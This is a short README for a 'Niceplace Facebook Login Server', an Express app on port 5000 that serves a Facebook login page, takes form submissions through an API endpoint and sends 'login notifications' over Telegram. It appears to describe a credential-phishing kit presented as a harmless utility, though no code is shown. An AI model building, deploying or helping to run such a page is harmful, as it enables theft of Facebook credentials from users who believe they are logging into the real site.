# Niceplace Facebook Login Server

This project serves the Facebook login component from the Niceplace application using a simple Express server.

## About Niceplace

Niceplace is a web application that includes a Facebook login interface. This project has been configured to serve just the Facebook login page component efficiently without the complexity of the full application.

## Project Structure

- `simple_server.js` - Express server that serves the Facebook login page
- `facebook_login.html` - The Facebook login interface from Niceplace
- `clone_and_run.sh` - Script to start the server

## Running the Application

There are two ways to run the application:

### Option 1: Using the provided script

Run the provided shell script to start the server:

```bash
./clone_and_run.sh
```

### Option 2: Running the server directly

If you prefer to run the server directly:

```bash
node simple_server.js
```

## Accessing the Application

Once the server is running, you can access the Facebook login page at:

```
http://localhost:5000
```

## Features

- Simple Express server that runs on port 5000
- Serves the Facebook login interface from Niceplace
- Handles form submissions via API endpoint
- Implements CORS for cross-origin requests
- Telegram integration for login notifications (when credentials are configured)
